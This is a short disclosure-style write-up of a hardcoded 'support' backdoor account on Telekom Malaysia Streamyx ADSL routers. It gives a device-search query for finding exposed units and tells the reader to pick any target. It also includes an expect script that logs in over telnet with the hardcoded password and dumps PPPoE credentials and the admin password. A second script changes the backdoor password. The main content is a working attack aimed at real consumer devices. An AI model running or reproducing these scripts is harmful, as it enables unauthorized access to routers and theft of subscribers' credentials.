# Telekom Malaysia Streamyx Backdoor
Search for "Virtual Web 0.9 country:MY"

![Image 1](http://i.imgur.com/XxD5y1v.png "Image 1")

Choose any target and execute the script below

```Bash
#!/usr/bin/expect

set timeout 20
set ip [lindex $argv 0]
spawn telnet $ip 23
expect "Username: "
send "support\n"
expect "Password: "
send "\$upp0rtS\n"
expect "$"
send "sh\n"
expect "ADSL#"
send "login show\n"
expect "ADSL#"
send "pppoe show\n"
expect "ADSL#"
```

Here is the sample output:

![Image 2](http://i.imgur.com/zT4hWFy.png "Image 2")

and that's it. You got the PPPOE credentials and also the administrator password for the login page.

Note: the user creation mechanism seems to be blocking any attempt to create a user with name other than tmXXXX. Also the delete function seems to be not working either. So we cannot delete the support account but we can change the password.

![Image 3](http://i.imgur.com/2qA1FOV.png "Image 3")

Nope!

![Image 4](http://i.imgur.com/QJGzq1k.png "Image 4")

and nope!

So here is the remedy. Execute the script below:

```Bash
#!/usr/bin/expect

set timeout 20
set ip [lindex $argv 0]
set pass [lindex $argv 1]
spawn telnet $ip 23
expect "Username: "
send "support\n"
expect "Password: "
send "\$upp0rtS\n"
expect "$"
send "sh\n"
expect "ADSL#"
send "configuration\n"
expect "ADSL(config)#"
send "passwithprio support $pass root\n"
expect "ADSL(config)#"
```
